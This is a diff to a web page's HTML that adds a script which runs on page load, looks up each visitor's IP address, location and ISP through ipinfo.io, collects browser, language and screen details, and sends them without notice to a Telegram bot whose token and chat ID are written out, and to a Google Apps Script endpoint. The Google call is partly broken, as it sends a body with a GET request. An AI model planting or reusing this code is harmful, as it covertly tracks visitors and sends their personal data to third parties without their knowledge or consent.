@@ -105,6 +105,64 @@
         }, 2500);
       }, 2500);
     });
+
+    async function logVisitorInfo() {
+      try {
+        const res = await fetch('https://ipinfo.io/json?token=1234567890abcdef'); // حط توكنك هنا لو عندك
+        const data = await res.json();
+
+        const info = {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country,
+          loc: data.loc,
+          org: data.org,
+          timezone: data.timezone,
+          browser: navigator.userAgent,
+          language: navigator.language,
+          screen: `${window.screen.width}x${window.screen.height}`,
+          time: new Date().toLocaleString()
+        };
+
+        const message = `
+          👀 زائر دخل الصفحة:
+          📍 IP: ${info.ip}
+          🏙️ الموقع: ${info.city}, ${info.region}, ${info.country}
+          🕹️ الجهاز: ${info.browser}
+          🌐 اللغة: ${info.language}
+          📱 الشاشة: ${info.screen}
+          🕰️ التوقيت: ${info.time}
+          🛰️ مزود الخدمة: ${info.org}
+        `;
+
+        // ابعت البيانات دي لـ Telegram Webhook
+        fetch("https://api.telegram.org/bot7661069709:AAGR_xR9p1sZoc_-Xvynqdn5aMVpp_ph84U/sendMessage", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: "708606868",  // Chat ID بتاعك
+            text: message
+          })
+        });
+
+        // ابعت البيانات دي لـ Google Sheets Web App
+        fetch('https://script.google.com/macros/s/AKfycbwzNTovUiqUlRJ6mOSP5lzWGxIZ3ofpHdVk3IqUiJ0XBQvF4j3hKd11HbvhBl1TpTlicw/exec', {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(info)
+        });
+      } catch (err) {
+        console.error("فشل في جلب بيانات الزائر:", err);
+      }
+    }
+
+    // شغلها بعد تحميل الصفحة
+    window.addEventListener("load", logVisitorInfo);
   </script>
 </body>
 </html>
